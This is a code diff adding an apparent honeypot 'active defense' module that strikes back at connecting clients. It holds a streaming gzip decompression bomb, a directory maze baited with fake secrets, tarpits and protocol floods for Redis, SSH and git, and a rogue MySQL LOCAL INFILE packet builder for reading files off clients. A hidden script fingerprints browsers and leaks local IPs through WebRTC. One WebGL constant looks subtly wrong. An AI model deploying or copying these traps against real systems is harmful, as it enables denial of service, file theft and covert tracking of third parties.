@@ -1,0 +1,663 @@
+/**
+ * OpenClaw HoneyAI — Active Defense Traps ("Operación Espina")
+ * Implements GZIP bombs, infinite recursive web mazes, and slow-drip tarpits.
+ */
+
+const zlib = require('zlib');
+const crypto = require('crypto');
+const { Readable } = require('stream');
+const { logger } = require('./logger');
+
+// ─── 1. Dynamic GZIP Bomb Streamer ──────────────────────────────────────────
+/**
+ * Streams a highly compressed stream of zero bytes on the fly.
+ * Compresses 5GB of zeros down to ~4.8MB on the wire.
+ * When decompressed by the attacker's client, it will consume huge resources.
+ *
+ * @param {import('http').ServerResponse} res
+ * @param {string} filename
+ */
+function streamGzipBomb(res, filename = 'backup.sql.gz') {
+    try {
+        res.writeHead(200, {
+            'Content-Type': 'application/x-gzip',
+            'Content-Encoding': 'gzip',
+            'Content-Disposition': `attachment; filename="${filename}"`,
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'X-Content-Type-Options': 'nosniff'
+        });
+
+        const gzip = zlib.createGzip({ level: 9 });
+        
+        // Stream 5GB of zeros
+        let bytesSent = 0;
+        const limitBytes = 5 * 1024 * 1024 * 1024; // 5 GB
+        const chunkSize = 65536; // 64KB chunks
+        const chunk = Buffer.alloc(chunkSize, 0);
+
+        const zeroStream = new Readable({
+            read() {
+                if (bytesSent >= limitBytes || res.writableEnded || res.destroyed) {
+                    this.push(null);
+                } else {
+                    this.push(chunk);
+                    bytesSent += chunkSize;
+                }
+            }
+        });
+
+        // Handle stream errors gracefully
+        zeroStream.on('error', (err) => {
+            logger.error(`GZIP zeroStream error: ${err.message}`, { protocol: 'http' });
+        });
+        gzip.on('error', (err) => {
+            logger.error(`GZIP compression error: ${err.message}`, { protocol: 'http' });
+        });
+
+        zeroStream.pipe(gzip).pipe(res);
+    } catch (err) {
+        logger.error(`Failed to initialize GZIP bomb: ${err.message}`, { protocol: 'http' });
+        if (!res.headersSent) {
+            res.writeHead(500, { 'Content-Type': 'text/plain' });
+            res.end('Internal Server Error');
+        }
+    }
+}
+
+// ─── 2. Infinite Web Directory Generator ─────────────────────────────────────
+// Seedable pseudo-random generator to make the maze stateless but consistent
+function getSeededRandom(seed) {
+    const hash = crypto.createHash('sha256').update(seed).digest();
+    let index = 0;
+    return () => {
+        if (index >= hash.length) {
+            const newHash = crypto.createHash('sha256').update(hash).digest();
+            hash.set(newHash);
+            index = 0;
+        }
+        return hash[index++] / 255;
+    };
+}
+
+const MAZE_DIR_PREFIXES = ['backup', 'archive', 'src', 'conf', 'logs', 'secure', 'admin', 'db', 'data', 'temp', 'old', 'private', 'staging', 'keys', 'secrets'];
+const MAZE_DIR_SUFFIXES = ['prod', 'dev', 'sys', 'web', 'local', 'corp', 'test', 'cloud', 'mirror', 'vault', 'storage', 'config', 'user', 'v2', 'legacy'];
+const MAZE_FILES = [
+    { name: 'config.json', isBomb: false },
+    { name: '.env', isBomb: false },
+    { name: 'backup.zip', isBomb: true },
+    { name: 'database.sql.gz', isBomb: true },
+    { name: 'passwords.txt', isBomb: false },
+    { name: 'id_rsa', isBomb: false },
+    { name: 'secrets.tar.gz', isBomb: true },
+    { name: 'network_architecture.pdf', isBomb: false, isRealBinary: true, mime: 'application/pdf', localPath: 'root/network_architecture.pdf' },
+    { name: 'company_passwords.docx', isBomb: false, isRealBinary: true, mime: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', localPath: 'root/company_passwords.docx' }
+];
+
+/**
+ * Dynamically generates a stateless, recursive directory page based on the request URL.
+ * Seeding makes the listing look identical when refreshed, but changes on every path extension.
+ *
+ * @param {import('http').IncomingMessage} req
+ * @param {import('http').ServerResponse} res
+ */
+function generateWebMaze(req, res) {
+    const urlPath = req.url || '/archive/';
+    
+    // Safety check: skip if requesting files directly
+    const baseName = urlPath.split('/').pop() || '';
+    if (baseName.includes('.')) {
+        const fileMatch = MAZE_FILES.find(f => f.name.toLowerCase() === baseName.toLowerCase());
+        if (fileMatch) {
+            if (fileMatch.isBomb) {
+                return streamGzipBomb(res, baseName);
+            } else if (fileMatch.isRealBinary) {
+                const fs = require('fs');
+                const path = require('path');
+                const realFilePath = path.join(__dirname, '../honeyfs', fileMatch.localPath);
+                if (fs.existsSync(realFilePath)) {
+                    res.writeHead(200, {
+                        'Content-Type': fileMatch.mime,
+                        'Content-Disposition': `attachment; filename="${fileMatch.name}"`,
+                        'Cache-Control': 'no-cache, no-store, must-revalidate',
+                        'X-Content-Type-Options': 'nosniff'
+                    });
+                    res.end(fs.readFileSync(realFilePath));
+                    return;
+                }
+            }
+            
+            // Return generic fake content
+            res.writeHead(200, { 'Content-Type': 'text/plain' });
+            res.end(`# Simulated configuration file for path: ${urlPath}\n# Nothing here.\n`);
+            return;
+        }
+    }
+
+    // Seed the randomizer with the path to keep listings consistent
+    const rand = getSeededRandom(urlPath);
+    
+    // Generate a list of 10 to 18 random directory names
+    const dirCount = Math.floor(rand() * 9) + 10;
+    const subDirs = [];
+    const usedNames = new Set();
+
+    for (let i = 0; i < dirCount; i++) {
+        const prefix = MAZE_DIR_PREFIXES[Math.floor(rand() * MAZE_DIR_PREFIXES.length)];
+        const suffix = MAZE_DIR_SUFFIXES[Math.floor(rand() * MAZE_DIR_SUFFIXES.length)];
+        const hash = crypto.createHash('sha256').update(`${urlPath}-${i}`).digest('hex').substring(0, 6);
+        const dirName = `${prefix}-${suffix}_${hash}`;
+        
+        if (!usedNames.has(dirName)) {
+            usedNames.add(dirName);
+            subDirs.push(dirName);
+        }
+    }
+
+    // Generate a few files
+    const fileCount = Math.floor(rand() * 4) + 2;
+    const files = [];
+    for (let i = 0; i < fileCount; i++) {
+        const fileTemplate = MAZE_FILES[Math.floor(rand() * MAZE_FILES.length)];
+        if (!files.some(f => f.name === fileTemplate.name)) {
+            files.push(fileTemplate);
+        }
+    }
+
+    // Sort listings alphabetically
+    subDirs.sort();
+    files.sort((a, b) => a.name.localeCompare(b.name));
+
+    // Ensure path ends with trailing slash for clean navigation links
+    const cleanPath = urlPath.endsWith('/') ? urlPath : urlPath + '/';
+
+    // Generate responsive Apache-style retro listing page with premium dark aesthetic
+    const html = `<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Index of ${cleanPath}</title>
+  <style>
+    body {
+      background-color: #0d0e15;
+      color: #c9d1d9;
+      font-family: 'Courier New', Courier, monospace;
+      padding: 30px;
+      margin: 0;
+    }
+    h1 {
+      color: #ff2d2d;
+      font-size: 24px;
+      border-bottom: 1px solid #30363d;
+      padding-bottom: 10px;
+    }
+    table {
+      width: 100%;
+      max-width: 1000px;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      text-align: left;
+      padding: 8px 12px;
+    }
+    th {
+      border-bottom: 2px solid #30363d;
+      color: #8b949e;
+      font-weight: bold;
+    }
+    tr:hover {
+      background-color: #161b22;
+    }
+    a {
+      color: #58a6ff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .parent-dir {
+      color: #d29922;
+    }
+    .footer {
+      margin-top: 40px;
+      border-top: 1px solid #30363d;
+      padding-top: 10px;
+      font-size: 12px;
+      color: #8b949e;
+    }
+  </style>
+</head>
+<body>
+  <h1>Index of ${cleanPath}</h1>
+  <table>
+    <tr>
+      <th>Name</th>
+      <th>Last Modified</th>
+      <th>Size</th>
+      <th>Description</th>
+    </tr>
+    ${cleanPath !== '/archive/' ? `
+    <tr>
+      <td><a class="parent-dir" href="${cleanPath.substring(0, cleanPath.lastIndexOf('/', cleanPath.length - 2)) || '/archive/'}">Parent Directory</a></td>
+      <td>-</td>
+      <td>-</td>
+      <td>Go back</td>
+    </tr>` : ''}
+    ${subDirs.map(dir => {
+        const lastMod = new Date(Date.now() - (Math.floor(rand() * 30) * 86400000)).toISOString().split('T')[0];
+        return `
+    <tr>
+      <td><a href="${cleanPath}${dir}/">${dir}/</a></td>
+      <td>${lastMod} 12:00</td>
+      <td>-</td>
+      <td>Directory</td>
+    </tr>`;
+    }).join('')}
+    ${files.map(file => {
+        const lastMod = new Date(Date.now() - (Math.floor(rand() * 10) * 86400000)).toISOString().split('T')[0];
+        const size = file.isBomb ? `${Math.floor(rand() * 3) + 4} KB` : '1.2 KB';
+        return `
+    <tr>
+      <td><a href="${cleanPath}${file.name}">${file.name}</a></td>
+      <td>${lastMod} 14:35</td>
+      <td>${size}</td>
+      <td>${file.isBomb ? 'Compressed Archive (Warning: Large)' : 'Configuration File'}</td>
+    </tr>`;
+    }).join('')}
+  </table>
+  <div class="footer">
+    Apache/2.4.51 (Ubuntu) Server at prod-server-01.internal Port 80
+  </div>
+</body>
+</html>
+`;
+
+    res.writeHead(200, {
+        'Content-Type': 'text/html; charset=utf-8',
+        'X-Content-Type-Options': 'nosniff',
+        'Cache-Control': 'no-cache, no-store, must-revalidate'
+    });
+    res.end(injectFingerprint(html));
+}
+
+// ─── 3. Reverse-Slowloris Tarpit Drip ────────────────────────────────────────
+/**
+ * Drips data back to a TCP socket or HTTP response extremely slowly.
+ * Wastes scanner/bot thread resources by holding the connection open.
+ *
+ * @param {import('net').Socket} socket
+ * @param {string|Buffer} data
+ * @param {number} intervalMs
+ */
+function dripSlowResponse(socket, data, intervalMs = 5000) {
+    if (!socket || socket.destroyed || !socket.writable) return;
+
+    const buffer = Buffer.isBuffer(data) ? data : Buffer.from(data);
+    let offset = 0;
+
+    const dripInterval = setInterval(() => {
+        if (socket.destroyed || !socket.writable) {
+            clearInterval(dripInterval);
+            return;
+        }
+
+        try {
+            // Write 1 byte at a time
+            const byte = buffer.slice(offset, offset + 1);
+            socket.write(byte);
+            offset++;
+
+            if (offset >= buffer.length) {
+                // Loop or close connection
+                clearInterval(dripInterval);
+                socket.end();
+            }
+        } catch (err) {
+            logger.error(`Tarpit Drip write error: ${err.message}`, { protocol: 'tarpit' });
+            clearInterval(dripInterval);
+        }
+    }, intervalMs);
+
+    socket.on('error', () => clearInterval(dripInterval));
+    socket.on('close', () => clearInterval(dripInterval));
+}
+
+
+// ─── 4. Redis MONITOR Flooder ────────────────────────────────────────────────
+/**
+ * Continuously floods the socket with fake Redis log updates.
+ * Wastes connection buffer on malicious clients.
+ *
+ * @param {import('net').Socket} socket
+ * @param {string} ip
+ */
+function floodRedisMonitor(socket, ip) {
+    if (!socket || socket.destroyed || !socket.writable) return;
+
+    const floodInterval = setInterval(() => {
+        if (socket.destroyed || !socket.writable) {
+            clearInterval(floodInterval);
+            return;
+        }
+
+        try {
+            const timestamp = (Date.now() / 1000).toFixed(6);
+            const fakeCommands = [
+                `+${timestamp} [0 ${ip}:53210] "PING"`,
+                `+${timestamp} [0 ${ip}:53210] "SET" "session:admin_token" "sk_live_51abc123def456ghi789"`,
+                `+${timestamp} [0 ${ip}:53210] "GET" "config:dbpass"`,
+                `+${timestamp} [0 ${ip}:53210] "KEYS" "*"`,
+                `+${timestamp} [0 ${ip}:53210] "INFO"`,
+                `+${timestamp} [0 ${ip}:53210] "CONFIG" "GET" "*"`,
+                `+${timestamp} [0 ${ip}:53210] "AUTH" "secret_pass123"`
+            ];
+            const fakeLine = fakeCommands[Math.floor(Math.random() * fakeCommands.length)] + '\r\n';
+            socket.write(fakeLine);
+        } catch (err) {
+            logger.error(`Redis MONITOR Flood write error: ${err.message}`, { protocol: 'redis' });
+            clearInterval(floodInterval);
+        }
+    }, 50);
+
+    socket.on('error', () => clearInterval(floodInterval));
+    socket.on('close', () => clearInterval(floodInterval));
+}
+
+// ─── 5. HTTP Redirect Loop Generator ─────────────────────────────────────────
+/**
+ * Generates an infinite redirect loop targeting scanners.
+ * Ends in a GZIP bomb after 10 loops.
+ *
+ * @param {import('http').IncomingMessage} req
+ * @param {import('http').ServerResponse} res
+ */
+function generateHttpRedirectLoop(req, res) {
+    const urlPath = req.url || '';
+    const match = urlPath.match(/\/archive\/loop\/(\d+)/);
+    const index = match ? parseInt(match[1], 10) : 1;
+
+    setTimeout(() => {
+        if (res.writableEnded || res.destroyed) return;
+
+        if (index < 10) {
+            res.writeHead(302, {
+                'Location': `/archive/loop/${index + 1}`,
+                'Cache-Control': 'no-cache, no-store, must-revalidate'
+            });
+            res.end();
+        } else {
+            // Point to the GZIP bomb as the exit trap
+            res.writeHead(302, {
+                'Location': `/archive/loop/critical-db-backup.sql.gz`,
+                'Cache-Control': 'no-cache, no-store, must-revalidate'
+            });
+            res.end();
+        }
+    }, 500); // 500ms delay per redirect
+}
+
+// ─── 6. SSH Command Tarpit Generator ─────────────────────────────────────────
+/**
+ * Streams slow responses for interactive commands to hang sessions.
+ *
+ * @param {import('ssh2').Channel} stream
+ * @param {string} command
+ * @param {function} onCleanup
+ * @returns {function} Cleanup function
+ */
+function tarpitSSHCommand(stream, command, onCleanup) {
+    const cmd = command.toLowerCase().trim();
+    let intervalId = null;
+
+    const cleanup = () => {
+        if (intervalId) {
+            clearInterval(intervalId);
+            intervalId = null;
+        }
+        if (onCleanup) onCleanup();
+    };
+
+    if (cmd.startsWith('ping')) {
+        let count = 0;
+        stream.write(`PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\r\n`);
+        
+        intervalId = setInterval(() => {
+            if (stream.destroyed || stream.writableEnded) {
+                cleanup();
+                return;
+            }
+            count++;
+            stream.write(`64 bytes from 8.8.8.8: icmp_seq=${count} ttl=56 time=${(10 + Math.random() * 20).toFixed(1)} ms\r\n`);
+        }, 1000);
+    } else if (cmd.startsWith('find') || cmd.startsWith('grep')) {
+        const dummyFiles = [
+            '/var/www/html/index.php',
+            '/var/www/html/.env',
+            '/var/www/html/config.json',
+            '/var/www/html/wp-config.php',
+            '/var/www/html/backup.sql',
+            '/etc/nginx/nginx.conf',
+            '/etc/nginx/sites-available/default',
+            '/etc/passwd',
+            '/etc/shadow',
+            '/root/.ssh/id_rsa',
+            '/root/.aws/credentials',
+            '/root/.bash_history',
+            '/root/.git/config',
+            '/opt/app/docker-compose.yml',
+            '/opt/app/.env'
+        ];
+        
+        let index = 0;
+        
+        intervalId = setInterval(() => {
+            if (stream.destroyed || stream.writableEnded || index >= dummyFiles.length) {
+                if (index >= dummyFiles.length) {
+                    stream.write(`\r\n`);
+                }
+                cleanup();
+                return;
+            }
+            
+            const file = dummyFiles[index++];
+            if (cmd.startsWith('find')) {
+                stream.write(`${file}\r\n`);
+            } else {
+                // grep matching output
+                stream.write(`${file}:# Simulated match key found\r\n`);
+            }
+        }, 500);
+    } else if (cmd.startsWith('nmap') || cmd.startsWith('masscan')) {
+        let pct = 0;
+        const scanName = cmd.startsWith('nmap') ? 'Nmap' : 'Masscan';
+        stream.write(`Starting ${scanName} 7.92 ( https://nmap.org ) at ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\r\n`);
+        
+        intervalId = setInterval(() => {
+            if (stream.destroyed || stream.writableEnded || pct >= 100) {
+                if (pct >= 100) {
+                    stream.write(`${scanName} done: 1 IP address (1 host up) scanned in ${(30 + Math.random() * 5).toFixed(2)} seconds\r\n`);
+                }
+                cleanup();
+                return;
+            }
+            pct += 10;
+            stream.write(`Stats: ${pct}.00% done; 0 hosts completed (1 up), 1 active\r\n`);
+        }, 3000);
+    } else {
+        // Fallback slow output
+        let dots = 0;
+        intervalId = setInterval(() => {
+            if (stream.destroyed || stream.writableEnded || dots >= 10) {
+                if (dots >= 10) {
+                    stream.write(`Operation timed out.\r\n`);
+                }
+                cleanup();
+                return;
+            }
+            dots++;
+            stream.write(`Scanning database resources... ${'.'.repeat(dots)}\r\n`);
+        }, 1000);
+    }
+
+    return cleanup;
+}
+
+// ─── 7. Rogue MySQL Infile Packet Encoder ─────────────────────────────────────
+/**
+ * Generates a MySQL Local Infile Request packet.
+ * Format: [3-byte packet length] [1-byte sequence number] [0xfb (infile command)] [filename]
+ *
+ * @param {string} filename
+ * @param {number} seqNum
+ * @returns {Buffer}
+ */
+function makeMySQLInfileRequest(filename, seqNum = 1) {
+    const filenameBuf = Buffer.from(filename, 'utf8');
+    const packetLength = filenameBuf.length + 1; // 1 byte for 0xfb command code
+
+    const header = Buffer.alloc(4);
+    header.writeUIntLE(packetLength, 0, 3);
+    header.writeUInt8(seqNum, 3);
+
+    const payload = Buffer.alloc(1);
+    payload.writeUInt8(0xfb, 0);
+
+    return Buffer.concat([header, payload, filenameBuf]);
+}
+
+// ─── 8. Git Infinite Clone Streamer ──────────────────────────────────────────
+/**
+ * Streams infinite Git refs to client clone commands to hang client processes.
+ *
+ * @param {import('net').Socket} socket
+ */
+function streamInfiniteGitRefs(socket) {
+    if (!socket || socket.destroyed || !socket.writable) return;
+
+    try {
+        // Step 1: Send Git smart service advertisement headers
+        const header1 = "001e# service=git-upload-pack\n";
+        const header2 = "0000";
+        socket.write(header1 + header2);
+
+        let branchCount = 0;
+        
+        // Step 2: Flood reference updates every 2000ms
+        const floodInterval = setInterval(() => {
+            if (socket.destroyed || !socket.writable) {
+                clearInterval(floodInterval);
+                return;
+            }
+
+            try {
+                branchCount++;
+                const mockHash = crypto.createHash('sha1').update(`branch-${branchCount}`).digest('hex');
+                // Git ref line format: 4-byte hex length + hash + refname + LF
+                // Example: 003f + hash + " refs/heads/branch-X\n"
+                const refLine = `${mockHash} refs/heads/branch-${branchCount}\n`;
+                const lenHex = (refLine.length + 4).toString(16).padStart(4, '0');
+                
+                socket.write(lenHex + refLine);
+            } catch (err) {
+                logger.error(`Git Infinite Clone flood write error: ${err.message}`, { protocol: 'git' });
+                clearInterval(floodInterval);
+            }
+        }, 2000);
+
+        socket.on('error', () => clearInterval(floodInterval));
+        socket.on('close', () => clearInterval(floodInterval));
+    } catch (err) {
+        logger.error(`Git Infinite Clone initialization failed: ${err.message}`, { protocol: 'git' });
+    }
+}
+
+// ─── 9. JS Browser Fingerprint & WebRTC Leak Script ──────────────────────────
+const JS_FINGERPRINT_SCRIPT = `
+<script>
+(function() {
+    try {
+        const payload = {
+            screen: \`\${window.screen.width}x\${window.screen.height}\`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cores: navigator.hardwareConcurrency || 'unknown',
+            gpu: 'unknown',
+            local_ips: []
+        };
+
+        // Canvas fingerprinting (GPU signature hash)
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    payload.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID_SGIX);
+                }
+            }
+        } catch (_) {}
+
+        // WebRTC Local IP Leak
+        try {
+            const myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+            if (myPeerConnection) {
+                const pc = new myPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = function(ice) {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        const candidate = ice.candidate.candidate;
+                        const match = candidate.match(/([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})/);
+                        if (match && match[1]) {
+                            const ip = match[1];
+                            if (!payload.local_ips.includes(ip)) {
+                                payload.local_ips.push(ip);
+                                sendPayload();
+                            }
+                        }
+                    }
+                };
+            }
+        } catch (_) {}
+
+        function sendPayload() {
+            fetch('/api/fingerprint', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        // Send baseline payload immediately
+        setTimeout(sendPayload, 1000);
+    } catch (_) {}
+})();
+</script>
+`;
+
+/**
+ * Injects the hidden fingerprint script before the closing body tag.
+ *
+ * @param {string} html
+ * @returns {string}
+ */
+function injectFingerprint(html) {
+    if (!html) return html;
+    if (html.includes('</body>')) {
+        return html.replace('</body>', JS_FINGERPRINT_SCRIPT + '</body>');
+    }
+    return html + JS_FINGERPRINT_SCRIPT;
+}
+
+module.exports = {
+    streamGzipBomb,
+    generateWebMaze,
+    dripSlowResponse,
+    floodRedisMonitor,
+    generateHttpRedirectLoop,
+    tarpitSSHCommand,
+    makeMySQLInfileRequest,
+    streamInfiniteGitRefs,
+    injectFingerprint
+};
+
+
